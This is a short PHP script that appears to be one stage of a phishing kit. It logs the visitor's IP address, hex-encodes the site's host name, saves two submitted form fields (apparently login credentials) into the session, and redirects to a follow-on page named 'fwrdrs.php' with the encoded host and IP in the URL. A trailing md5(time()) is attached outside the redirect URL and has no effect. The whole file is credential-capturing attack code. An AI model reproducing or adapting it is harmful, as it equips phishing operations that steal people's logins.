<?php
ini_set("output_buffering",4096);
session_start();
$ip = getenv("REMOTE_ADDR");
$hosnm = bin2hex ($_SERVER['HTTP_HOST']);
$_SESSION['txt1'] = $_POST['1txt'];
$_SESSION['txt2'] = $_POST['2txt'];
header("Location: fwrdrs.php?valid=true&header=$hosnm&$ip").md5(time());
?>